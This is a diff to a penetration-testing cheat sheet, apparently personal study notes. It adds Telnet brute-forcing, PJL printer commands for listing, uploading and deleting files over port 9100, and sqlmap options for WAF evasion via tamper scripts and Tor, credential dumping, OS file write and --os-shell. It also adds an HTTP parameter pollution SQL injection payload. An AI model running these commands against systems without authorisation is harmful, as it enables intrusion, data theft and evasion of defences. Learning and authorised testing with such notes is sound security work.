@@ -487,6 +487,14 @@ Here some way to deal with them:
 - Possible settings: [man page](http://vsftpd.beasts.org/vsftpd_conf.html).
 - `/etc/ftpusers` is used to deny certain users access to the FTP service.
 
+### 23 - Telnet
+
+It is a shell (old ssh)
+
+-  nmap is enough for enumeration
+- hydra to bruteforce
+- To connect: `telnet [IP]`
+
 ### 22 - SSH
 
 #### Generalities
@@ -2078,6 +2086,31 @@ Once inside redis environment `info` return information about the  server
 - `keys *` List all the keys in the database
 - `get {key}`
 
+### 9100 - Raw Printing
+
+Raw port 9100 printing, also referred to as JetDirect, AppSocket or PDL-datastream actually **is not a printing protocol by itself**. Instead **all data sent is directly processed by the printing device**, just like a parallel connection over TCP.
+
+**Enumeration**
+
+```bash
+nc -vn <IP> 9100
+@PJL INFO STATUS      #CODE=40000   DISPLAY="Sleep"   ONLINE=TRUE
+@PJL INFO ID          # ID (Brand an version)
+@PJL INFO PRODINFO    #Product info
+@PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=65535  #List dir
+@PJL INFO VARIABLES   #Env variales
+@PJL INFO FILESYS     #?
+@PJL INFO TIMEOUT     #Timeout variables
+@PJL RDYMSG           #Ready message
+@PJL FSINIT
+@PJL FSDIRLIST
+@PJL FSUPLOAD         #Useful to upload a file
+@PJL FSDOWNLOAD       #Useful to download a file
+@PJL FSDELETE         #Useful to delete a file
+```
+
+
+
 ## Active Directory
 
 It is a collection of machines, called *clients*, handled by the *domain controller (DC)*, which is a master server of one domain, thus it creates one (and only one) domain. 
@@ -2483,7 +2516,7 @@ Windows:
 
 #### SQL Injections
 
-**Injection types**:
+##### Injection types:
 
 - **Union Based:** 
   - output readable on the front-end
@@ -2501,7 +2534,7 @@ Windows:
 - **Out of Band:**
   - output in a DNS record
 
-**Context:**
+##### Context:
 
 Relational database structure in the back-end (e.g. MySQL). *Relational databases* have data stored in tables and use SQL for queries
 
@@ -2537,13 +2570,15 @@ Relational database structure in the back-end (e.g. MySQL). *Relational database
 
 - IIS &rarr; Probably Windows &rarr; likely `MSSQL`
 
-**sqlmap:** 
+##### sqlmap: 
 
 - [Wiki & Usage](https://github.com/sqlmapproject/sqlmap/wiki/usage) 
 - In Net Inspector: `Copy` > `Copy Request Headers`
 - `sqlscan <query.txt>`
 
 ```bash
+#-----------------------------GENERAL----------------------------------
+
 # General query
 sqlmap [CURL_QUERY]	/ -r [query.txt] 			# Test all parameters
 sqlmap [CURL_QUERY] -p [PARAM_TO_TEST]
@@ -2557,9 +2592,16 @@ sqlmap [CURL_QUERY + APPEND * TO PARAM TO TEST]
 --dump-all --exclude-sysdbs		# Automatically dump all the data
 --flush-session --fresh-queries	# Clean prev sessions
 --threads 10
+-v 3
+
+# DB Enumeration
+--schema 						# Table structure
+--search [ -T, -C] <string>		# search as LIKE operator in table, col
+--dump -D <db> -T <table>		# Dump a table
+--passwords						# Find credentials
 
 # Payload tuning
---prefix= / --suffix=				# Boundaries of the payload
+--prefix= / --suffix=			# Boundaries of the payload
 --level=<1-5 [d1]> 				# Extends payloads based on success prob
 --risk=<1-3 [d1]>				# Extends payloads based on risk
 
@@ -2567,23 +2609,46 @@ sqlmap [CURL_QUERY + APPEND * TO PARAM TO TEST]
 --titles=<http_title>
 --string=<success_string>
 --text-only 					# Comparison only on visible content
---technique=BEU
+--technique=BEUSQT
 
 -union-cols=<No.DB columns>		# For UNION Inj
 --union-char='a'				# Value of the column (default NULL)
 --union-from=<table>			# append in the form FROM <table>	
 
-# Security measures
---random-agent 					#random User-agent 
---mobile 						# imitate a smartphone
+#-----------------------------BYPASS----------------------------------
 
-# Error Handling
+# WAF bypass 
+--skip-waf						# Skip WAF identification
+--random-agent 					# random User-agent 
+--mobile 						# Imitate a smartphone  
+--tor --check-tor				# Tor proxy: sudo service tor start
+--chunked						# Splits POST requests in chunks
+--list-tampers					# Determine tamper with ~/TOOLS/ATLAS.py
+--tamper=between,space2comment,equaltolike,escapequotes
+
+# Debugging
 --parse-errors						# Show DBMS errors
 -t /tmp/traffic.txt					# Stores traffic content
 --proxy	"http://127.0.0.1:9999"		# redirect to a proxy (Burp)
+
+# Protections Bypass
+--csrf-token="<param>"			# Against Cross-Site Request Forgery 
+--randomize=<param>				# Param to randomize
+--eval=<Py code with param>		# Dinamically computes value of param
+
+#-----------------------------EXPLOIT----------------------------------
+
+# OS File read / write
+--is-dba						# Check for r/w privilidges
+--file-read "<path>"			# OS file read (saved in a file)
+
+--file-write "<your_local_file>" --file-dest "<remote_path>"
+
+# OS Command execution
+--os-shell
 ```
 
-How to discover prefix:
+**Prefix and Suffices:**
 
 ```bash
 ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.txt:FUZZ1 -w /usr/share/wordlists/sql_suff.txt:FUZZ2
@@ -2603,8 +2668,21 @@ ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.t
       - MYSQL: `OR SELECT sleep(10)`
       - ORACLE: `OR dbms_pipe.receive_message(('a'),10)`
 
+##### WAF Bypass
 
-**MYSQL:**
+- See SQLmap WAS Bypass section
+
+- Identify TAMPER:
+
+  - ```bash
+    python3 ~/TOOLS/atlas/atlas.py
+    ```
+
+- HPP (HTTP parameter pollution): split the payload for GET request
+
+  e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`
+
+##### MYSQL:
 
 - **Login Bypass**
 
@@ -4109,6 +4187,7 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 ### Fundamentals
 
 - Execute bash script: `chmod +x [FILE]` &rarr; `./[FILE]`
+- Bash command (for broken shells) `bash -c "<command>"`
 
 ### Users & Privileges
 
